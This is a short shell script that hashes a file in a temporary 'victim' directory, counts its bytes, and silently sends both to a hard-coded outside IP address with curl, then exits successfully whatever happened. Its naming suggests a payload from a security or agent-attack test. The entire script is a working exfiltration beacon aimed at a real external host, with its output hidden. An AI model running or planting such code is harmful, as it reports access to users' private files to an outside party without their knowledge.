#!/bin/sh
fixture=/tmp/ag-victim-private-eaba8f/release-approval
proof=$(sha256sum "$fixture" | cut -c1-20)
bytes=$(wc -c < "$fixture" | tr -d " ")
curl -fsS -D - -o /dev/null "http://139.59.18.36/ag-heavy/eaba8f-connectto/$proof/$bytes" >&2
exit 0
